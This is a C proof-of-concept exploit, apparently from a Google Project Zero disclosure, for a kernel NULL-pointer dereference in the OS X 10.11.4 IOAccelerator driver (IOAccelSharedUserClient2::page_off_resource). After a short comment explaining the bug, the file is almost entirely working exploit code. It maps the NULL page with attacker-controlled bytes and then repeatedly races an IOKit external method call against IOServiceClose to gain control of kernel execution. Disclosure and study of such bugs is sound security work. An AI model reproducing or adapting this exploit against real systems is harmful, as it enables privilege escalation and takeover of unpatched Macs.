/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=778

IOAccelerator external method IOAccelSharedUserClient2::page_off_resource uses the pointer at this+0x100 without checking if it's NULL.
A series of dereferences from this pointer lead to trivial RIP control.

We can race two threads, in one call the external method and in the other call IOServiceClose, which NULLs out the pointer at
this+0x100.

By mapping the NULL page into userspace we can control the pointer read.

tested on OS X 10.11.4 (15E65) on MacBookAir 5,2
*/

//ianbeer

//clang -o ioaccel_race ioaccel_race.c -framework IOKit -m32 -lpthread -pagezero_size 0x0

/*
OS X exploitable kernel NULL dereference in IOAccelSharedUserClient2::page_off_resource

IOAccelerator external method IOAccelSharedUserClient2::page_off_resource uses the pointer at this+0x100 without checking if it's NULL.
A series of dereferences from this pointer lead to trivial RIP control.

We can race two threads, in one call the external method and in the other call IOServiceClose, which NULLs out the pointer at
this+0x100.

By mapping the NULL page into userspace we can control the pointer read.

tested on OS X 10.11.4 (15E65) on MacBookAir 5,2
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <IOKit/IOKitLib.h>

#include <libkern/OSAtomic.h>

#include <mach/thread_act.h>

#include <pthread.h>

#include <mach/mach.h>
#include <mach/vm_map.h>
#include <sys/mman.h>
    
unsigned int selector = 0;

uint64_t inputScalar[16];
size_t inputScalarCnt = 0;

uint8_t inputStruct[40960];
size_t inputStructCnt = 0; 

uint64_t outputScalar[16] = {0};
uint32_t outputScalarCnt = 0;

char outputStruct[40960] = {0};
size_t outputStructCnt = 0;

io_connect_t global_conn = MACH_PORT_NULL;

void set_params(io_connect_t conn){
  global_conn = conn;
  selector = 2;
  inputScalarCnt = 0;
  inputStructCnt = 8; 
  outputScalarCnt = 0;
  outputStructCnt = 0;  
}

void make_iokit_call(){  
  IOConnectCallMethod(
      global_conn,
      selector,
      inputScalar,
      inputScalarCnt,
      inputStruct,
      inputStructCnt,
      outputScalar,
      &outputScalarCnt,
      outputStruct,
      &outputStructCnt);
}

OSSpinLock lock = OS_SPINLOCK_INIT;

void* thread_func(void* arg){
  int got_it = 0;
  while (!got_it) {
    got_it = OSSpinLockTry(&lock);
  }

  // usleep(1);

  make_iokit_call();
  return NULL;
}

mach_port_t get_user_client(char* name, int type) {
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching(name);
  if(!matching){
   printf("unable to create service matching dictionary\n");
   return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
   printf("no matches\n");
   return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
   printf("unable to find service\n");
   return 0;
  }
  printf("got service: %x\n", service);


  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), type, &conn);
  if (err != KERN_SUCCESS){
   printf("unable to get user client connection\n");
   return 0;
  }

  printf("got userclient connection: %x\n", conn);

  return conn;
}

void poc(){
  OSSpinLockLock(&lock);

  pthread_t t;
  pthread_create(&t, NULL, thread_func, NULL);


  mach_port_t conn = get_user_client("IntelAccelerator", 6);
  
  set_params(conn);
  OSSpinLockUnlock(&lock);
  IOServiceClose(conn);
  pthread_join(t, NULL);
}

int main(int argc, char** argv){
  kern_return_t err;
  // re map the null page rw
  int var = 0;
  err = vm_deallocate(mach_task_self(), 0x0, 0x1000);
  if (err != KERN_SUCCESS){
    printf("%x\n", err);
  }
  vm_address_t addr = 0;
  err = vm_allocate(mach_task_self(), &addr, 0x1000, 0);
  if (err != KERN_SUCCESS){
    if (err == KERN_INVALID_ADDRESS){
      printf("invalid address\n");
    }
    if (err == KERN_NO_SPACE){
      printf("no space\n");
    }
    printf("%x\n", err);
  }
  char* np = 0;
  for (int i = 0; i < 0x1000; i++){
    np[i] = '\x41';
  }

  for(;;) {
    poc();
  }
  return 0;

}
